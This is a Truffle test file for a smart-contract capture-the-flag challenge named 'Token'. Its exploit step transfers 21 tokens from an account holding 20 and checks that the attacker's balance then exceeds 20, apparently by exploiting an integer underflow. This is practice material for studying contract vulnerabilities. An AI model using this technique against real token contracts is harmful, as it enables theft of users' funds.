const Token = artifacts.require('Token');
const { ether, expectRevert, expectEvent } = require('@openzeppelin/test-helpers');
const { expect } = require('chai');

contract('[Challenge] Token', function ([deployer, attacker, someUser, ...otherAccounts]) {
  before(async function () {
    /** SETUP SCENARIO */
    this.token = await Token.new('20', { from: attacker });
  });

  it('Exploit', async function () {
    /** YOUR EXPLOIT GOES HERE */
    await this.token.transfer(someUser, '21', { from: attacker });
  });

  after(async function () {
    /** SUCCESS CONDITIONS */
    expect(await this.token.balanceOf(attacker)).to.be.bignumber.gt('20');
  });
});
